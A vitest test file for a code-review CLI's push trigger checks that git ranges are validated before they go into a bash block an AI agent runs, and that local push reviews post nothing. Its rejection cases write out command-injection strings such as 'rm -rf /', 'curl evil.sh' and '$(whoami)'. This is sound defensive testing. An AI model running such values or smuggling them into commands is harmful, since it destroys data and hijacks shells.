// #276 — the `push` trigger of `review-prompt`.
//
// Two things were wrong before the pre-push surface existed, and both are
// covered here:
//
//   1. `push` fell through to the PR branch of the recipe, which tells the
//      agent to "post or edit … the clud-bug summary comment". SPEC 2.0 §4.3:
//      "A review run locally has no pull request to comment on (§4.1) — it
//      writes its findings to the terminal, in the same shape and the same
//      order, and MUST NOT post anything or write a file." So the shipped
//      `--trigger push` recipe instructed a §4.3 violation.
//   2. There was no way to say WHAT is being pushed. The range now comes from
//      the pre-push hook, and — because it is rendered into a ```bash fence the
//      agent is told to run — it is validated, not escaped.

import { describe, expect, it } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

import { renderReviewRecipe, sanitizeRange } from '../src/cli/review-prompt.js';
import { planReview } from '../src/core/plan-review.js';

const CLI = join(dirname(dirname(fileURLToPath(import.meta.url))), 'bin', 'clud-bug.js');
const SKILLS = [{ slug: 'critical-issues-only', frontmatter: {} }];
const plan = (trigger) => planReview({ skills: SKILLS, config: { count: 1, mode: 'cross-check' }, trigger });

describe('sanitizeRange', () => {
  it('accepts real git ranges', () => {
    for (const good of [
      'abc123..def456',
      'origin/main...HEAD',
      'v1.2.3..HEAD',
      'HEAD~3..HEAD',
      'refs/heads/main..refs/heads/topic',
      'HEAD@{1}..HEAD',
    ]) {
      expect(sanitizeRange(good)).toBe(good);
    }
  });

  it('rejects anything that could escape the bash fence it is rendered into', () => {
    for (const bad of [
      'a..b; rm -rf /',
      'a..b && curl evil.sh',
      'a..$(whoami)',
      'a..`id`',
      'a..b\nrm -rf /',
      'a..b | sh',
      '$(id)..HEAD',
      'a..b > /etc/passwd',
      "a..b'; echo pwned; '",
    ]) {
      expect(sanitizeRange(bad)).toBeUndefined();
    }
  });

  it('rejects shapes that are not a single two- or three-dot range', () => {
    for (const bad of ['HEAD', '', '   ', '..HEAD', 'HEAD..', 'a..b..c', '-x..HEAD', undefined, 42]) {
      expect(sanitizeRange(bad)).toBeUndefined();
    }
  });

  it('rejects an absurdly long value rather than rendering it', () => {
    expect(sanitizeRange(`${'a'.repeat(600)}..HEAD`)).toBeUndefined();
  });
});

describe('renderReviewRecipe — push trigger', () => {
  it('§4.3: a push review posts NOTHING — it is not the PR recipe', () => {
    const recipe = renderReviewRecipe({ plan: plan('push'), trigger: 'push', pushRange: 'aaa..bbb' });
    expect(recipe).toMatch(/post nothing and write no file/i);
    expect(recipe).not.toMatch(/post or edit/i);
    // …and it carries no merge-gate/certify step: there is no PR head to anchor
    // a check to (§5 is `pr`-only).
    expect(recipe).not.toMatch(/post-check-run/);
  });

  it('reviews the RANGE once, not commit by commit', () => {
    const recipe = renderReviewRecipe({ plan: plan('push'), trigger: 'push', pushRange: 'aaa..bbb' });
    expect(recipe).toContain('git diff --no-color aaa..bbb');
    expect(recipe).toContain('git log --no-color --oneline aaa..bbb');
    expect(recipe).toMatch(/one review of the whole range/i);
    // no `git show` per commit
    expect(recipe).not.toMatch(/git show --no-color/);
  });

  it('falls back to the branch-vs-base diff when no range could be computed', () => {
    const recipe = renderReviewRecipe({ plan: plan('push'), trigger: 'push' });
    expect(recipe).toMatch(/git diff --no-color origin\/HEAD\.\.\.HEAD/);
    // still a local run: nothing is posted
    expect(recipe).toMatch(/post nothing and write no file/i);
  });

  it('§4.1: a push review still gets the FULL multi-pass plan (only commit tiers down)', () => {
    const multi = { count: 3, mode: 'cross-check' };
    const pushPlan = planReview({ skills: SKILLS, config: multi, trigger: 'push' });
    const commitPlan = planReview({ skills: SKILLS, config: multi, trigger: 'commit' });
    expect(pushPlan.tieredDown).toBeUndefined();
    expect(commitPlan.tieredDown).toBe('commit');
    expect(renderReviewRecipe({ plan: pushPlan, trigger: 'push' })).toMatch(/Dispatch 3 reviewer/i);
  });
});

describe('review-prompt verb — push trigger (integration)', () => {
  async function repoWithSkills() {
    const dir = await mkdtemp(join(tmpdir(), 'clud-bug-rp-push-'));
    const skillsDir = join(dir, '.claude', 'skills');
    await mkdir(skillsDir, { recursive: true });
    await writeFile(join(skillsDir, '.clud-bug.json'), JSON.stringify({ version: 1, installed: [] }));
    return dir;
  }

  it('threads a valid --range into the recipe', async () => {
    const dir = await repoWithSkills();
    const r = spawnSync(
      process.execPath,
      [CLI, 'review-prompt', '--trigger', 'push', '--range', 'abc1234..def5678'],
      { cwd: dir, encoding: 'utf8', timeout: 30000 },
    );
    expect(r.status).toBe(0);
    expect(r.stdout).toContain('git diff --no-color abc1234..def5678');
    expect(r.stderr).not.toMatch(/ignoring an unusable --range/);
  });

  it('§6.5: drops an unusable --range LOUDLY, and still renders a usable recipe', async () => {
    const dir = await repoWithSkills();
    const r = spawnSync(
      process.execPath,
      [CLI, 'review-prompt', '--trigger', 'push', '--range', 'a..b; rm -rf /'],
      { cwd: dir, encoding: 'utf8', timeout: 30000 },
    );
    expect(r.status).toBe(0);
    expect(r.stderr).toMatch(/ignoring an unusable --range/);
    expect(r.stdout).not.toContain('rm -rf');
    expect(r.stdout).toMatch(/git diff --no-color origin\/HEAD\.\.\.HEAD/);
  });

  it('§4.1: a bare `review-prompt` is a PUSH review', async () => {
    const dir = await repoWithSkills();
    const r = spawnSync(process.execPath, [CLI, 'review-prompt'], {
      cwd: dir,
      encoding: 'utf8',
      timeout: 30000,
    });
    expect(r.status).toBe(0);
    expect(r.stdout).toMatch(/about to push/i);
    // The commit recipe's §1 is a `git show` of HEAD; a push recipe never is.
    // (Do not grep for "the commit you just made" — that phrase also lives in
    // the execution-safety rule, which every trigger renders.)
    expect(r.stdout).not.toMatch(/git show --no-color/);
  });

  it('--range is ignored on a commit trigger (it describes a push, not a commit)', async () => {
    const dir = await repoWithSkills();
    const r = spawnSync(
      process.execPath,
      [CLI, 'review-prompt', '--trigger', 'commit', '--range', 'abc1234..def5678'],
      { cwd: dir, encoding: 'utf8', timeout: 30000 },
    );
    expect(r.status).toBe(0);
    expect(r.stdout).not.toContain('abc1234..def5678');
    expect(r.stdout).toMatch(/git show[^\n]*HEAD/);
  });
});
